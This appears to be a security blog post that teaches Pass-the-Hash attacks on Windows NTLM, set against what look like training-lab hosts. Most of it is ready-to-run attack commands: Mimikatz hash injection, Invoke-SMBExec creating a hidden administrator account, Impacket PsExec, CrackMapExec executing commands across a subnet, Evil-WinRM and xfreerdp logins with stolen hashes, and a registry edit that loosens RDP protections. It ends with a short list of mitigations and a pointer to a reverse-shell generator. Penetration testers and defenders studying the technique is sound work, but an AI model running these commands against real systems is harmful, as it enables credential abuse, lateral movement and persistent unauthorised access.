---

title: "Pass the Hash (PtH) Attack: A Practical Guide"
date: 2025-05-25 00:00:00 +0000
categories: \[Security, Red Team]
tags: \[pass-the-hash, NTLM, windows, pentesting, mimikatz, impacket, crackmapexec]
pin: false
----------

A Pass the Hash (PtH) attack is a technique in which an attacker uses a password hash to authenticate to remote systems instead of the plaintext password. This method exploits authentication protocols like NTLM that accept hashed credentials without decrypting them. Since the hash remains valid until the user changes the password, it can be reused multiple times, making it a powerful attack vector.

---

### Requirements for a PtH Attack

To execute a PtH attack, the attacker typically needs elevated privileges on the target system to extract password hashes. Common methods to acquire these hashes include:

* Dumping the Security Account Manager (SAM) database.
* Extracting hashes from the NTDS.dit file on a Domain Controller.
* Retrieving hashes from memory (e.g., lsass.exe).

---

## Windows NTLM Overview

NTLM (New Technology LAN Manager) is a challenge-response authentication protocol still used in Windows environments, primarily for backward compatibility. However, it lacks modern security features like salting passwords, making it vulnerable to PtH attacks.

Read more at Microsoft's documentation: [NTLM Authentication](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm)

---

## Performing PtH Attacks

### 1. **Using Mimikatz (Windows)**

Mimikatz includes the `sekurlsa::pth` module, which starts a new process with a specified user's hash:

```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe"
```

Reference: [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)

---

### 2. **Invoke-TheHash (Windows)**

Invoke-TheHash is a PowerShell toolset for PtH attacks using SMB and WMI:

```powershell
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add"
```

For a reverse shell, use: [https://www.revshells.com](https://www.revshells.com)

Tool: [Invoke-TheHash GitHub](https://github.com/Kevin-Robertson/Invoke-TheHash)

---

### 3. **Impacket PsExec (Linux)**

Impacket provides various Python-based tools for network attacks:

```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

Tool: [Impacket GitHub](https://github.com/fortra/impacket)

---

### 4. **CrackMapExec (Linux)**

CrackMapExec is ideal for automating enumeration and attack steps in AD environments:

```bash
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

Documentation: [NetExec Wiki](https://netexec.readthedocs.io/en/latest/)

---

### 5. **Evil-WinRM (Linux)**

Evil-WinRM allows PowerShell Remoting with hashes:

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

Tool: [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)

---

### 6. **Using xfreerdp for RDP (Linux)**

Ensure Restricted Admin Mode is enabled, then:

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

More on configuring RDP for PtH: [FreeRDP Wiki](https://github.com/FreeRDP/FreeRDP/wiki)

---

## UAC and LocalAccountTokenFilterPolicy

UAC restricts remote administrative access for local accounts unless configured properly. Modify these registry keys to enable remote use:

```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

For more details, see Will Schroeder’s blog: [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)

---

## Conclusion

Pass the Hash remains a critical threat in Windows environments relying on NTLM. Tools like Mimikatz, Impacket, and CrackMapExec make exploitation straightforward if proper defenses aren't in place. Organizations should consider mitigating PtH by disabling NTLM where possible, enforcing strong credential hygiene, using LAPS, and monitoring authentication logs.

**Always test ethically and in controlled environments. For educational use only.**
